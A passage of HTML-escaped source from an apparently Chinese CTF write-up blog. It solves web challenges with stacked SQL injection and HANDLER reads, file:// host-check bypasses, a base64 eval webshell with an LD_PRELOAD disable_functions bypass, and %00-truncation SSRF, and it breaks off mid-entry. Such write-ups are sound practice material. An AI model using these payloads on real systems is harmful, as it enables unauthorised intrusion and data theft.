class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;  输出一个文件&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       返回数组中的当前单元, 默认取第一个值&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;           current() 的别名&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数将内部指针指向数组中的下一个元素，并输出。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       将内部指针指向数组中的最后一个元素，并输出。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_rand&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; 函数从指定的 ASCII 值返回字符。&lt;br&gt;hex2bin — 转换十六进制字符串为二进制字符串&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;        获取一个环境变量的值(在&lt;span class=&#34;hljs-number&#34;&gt;7.1&lt;/span&gt;之后可以不给予参数)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gyctf2020blacklist&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gyctf2020blacklist&#34;&gt;#&lt;/a&gt; [GYCTF2020]Blacklist&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;preg_match(&amp;quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i&amp;quot;,$inject);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第一眼看题目像强网杯随便注，同样测试堆叠注入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show tables;&lt;/code&gt; =&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FlagHere&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;words&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show columns from FlagHere;&lt;/code&gt; =&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sml&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;) &amp;#123;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;varchar(100)&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NO&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;NULL&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;suctf-2019pythonginx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf-2019pythonginx&#34;&gt;#&lt;/a&gt; [SUCTF 2019]Pythonginx&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;def getUrl():&lt;br&gt;    url = request.args.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;)&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(url).hostname&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;我扌 your problem? 111&amp;quot;&lt;/span&gt;&lt;br&gt;    parts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;urlsplit&lt;/span&gt;(url))&lt;br&gt;    host = parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;我扌 your problem? 222 &amp;quot;&lt;/span&gt; + host&lt;br&gt;    newhost = []&lt;br&gt;    for h in host.&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;):&lt;br&gt;        newhost.&lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(h.&lt;span class=&#34;hljs-built_in&#34;&gt;encode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;idna&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;decode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;br&gt;    parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;join&lt;/span&gt;(newhost)&lt;br&gt;    #去掉 url 中的空格&lt;br&gt;    finalUrl = &lt;span class=&#34;hljs-built_in&#34;&gt;urlunsplit&lt;/span&gt;(parts).&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(finalUrl).hostname&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return urllib.request.&lt;span class=&#34;hljs-built_in&#34;&gt;urlopen&lt;/span&gt;(finalUrl, timeout=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt;()&lt;br&gt;    else:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;我扌 your problem? 333&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第一层，当 &lt;code&gt;//&lt;/code&gt;  没有正确引入时 hostname 就无法正确匹配到，也就是说我们只要 &lt;code&gt;////&lt;/code&gt;  即可绕过第一层&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二、三层和第一层一样，也绕过了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Nginx 重要文件位置&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;br&gt;配置文件存放目录：&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;br&gt;主配置文件：&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;span class=&#34;hljs-regexp&#34;&gt;/conf/&lt;/span&gt;nginx.conf&lt;br&gt;管理脚本：&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lib64&lt;span class=&#34;hljs-regexp&#34;&gt;/systemd/&lt;/span&gt;system/nginx.service&lt;br&gt;模块：&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lisb64&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/m&lt;/span&gt;odules&lt;br&gt;应用程序：&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;sbin/nginx&lt;br&gt;程序默认存放位置：&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;share&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;html&lt;br&gt;日志默认存放位置：&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/nginx&lt;br&gt;配置文件目录为：&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;local&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;conf/nginx.conf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;/usr/local/nginx/conf/nginx.conf 读到 flag 位置 file:////suctf.cc/usr/fffffflag 拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;据说预期解是 &lt;code&gt;file://suctf.c℆sr/fffffflag&lt;/code&gt; (&lt;a href=&#34;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&#34;&gt;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gkctf2020checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gkctf2020checkin&#34;&gt;#&lt;/a&gt; [GKCTF2020]CheckIN&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Check_In&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ClassName&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$code&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$decode&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code = @&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;x()[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Ginkgo&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode = @base64_decode( &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;Eval&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;x&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ClassName();&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;给了 shell，先看一下 phpinfo，发现有 disable_functions，应该是饶 disable_functions 的题目， &lt;code&gt;/var/tmp/&lt;/code&gt;  可以写文件，参考 LD_PRELOAD 的 without send_mail 方法绕过，利用 /readflag 命令拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gkctf2020cve版签到&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gkctf2020cve版签到&#34;&gt;#&lt;/a&gt; [GKCTF2020] cve 版签到&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;提示 cve-2020-7066，也就是可以 %00 截断&lt;/li&gt;
&lt;li&gt;header 里有 hint 提示 flag 在 localhost&lt;/li&gt;
&lt;li&gt;访问？url=127.0.0.1%00.ctfhub.com 拿到提示 host 要以 123 结尾&lt;/li&gt;
&lt;li&gt;访问？url=127.0.0.123%00.ctfhub.com 拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安洵杯-2019easy_web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019easy_web&#34;&gt;#&lt;/a&gt; [安洵杯 2019] easy_web&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;url 中的 img 经过 2 次 base64 解码 + 1 次 ASCII Hex 解码得到 555.png，于是把 555.png 改成 index.php 读到源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span 